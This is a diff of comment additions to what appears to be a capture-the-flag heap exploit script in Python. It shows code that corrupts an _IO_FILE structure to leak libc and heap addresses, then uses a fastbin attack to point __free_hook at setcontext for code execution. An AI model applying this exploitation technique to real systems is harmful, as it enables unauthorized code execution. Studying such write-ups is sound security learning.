@@ -73,12 +73,12 @@ def exploit(host):
                 free(value+0x10)
                 return magic_size
 
+            # rewrite _IO_FILE for leak
             write_with_heap_address(0x7ffff7df1638, 0x300)
             edit(0x350, 0x10, p64(0x0)+p64(0x71))
             edit(0x350+0x70, 0x10, p64(0x0)+p64(0x71))
             free(0x350+0x10)
             write_with_heap_address(0x7ffff7df1628, 0x380)
-
 
             r.recv(8)
             r.recv(0x10)
@@ -88,8 +88,11 @@ def exploit(host):
             log.info(hex(libc_base))
             log.info(hex(heap_base))
 
+            # fastbin attack. rewrite __free_hook with base+0x480
             sz = write_with_heap_address(0x7ffff7df2788, 0x480)
+            # rewrite (base+0x480)->fd with setcontext addr
             edit(0x480+0x10, 0x8, p64(libc_base+0x43565))
+            # malloc. now __free_hook == setcontext
             add(sz-0x10)
 
             payload = ''
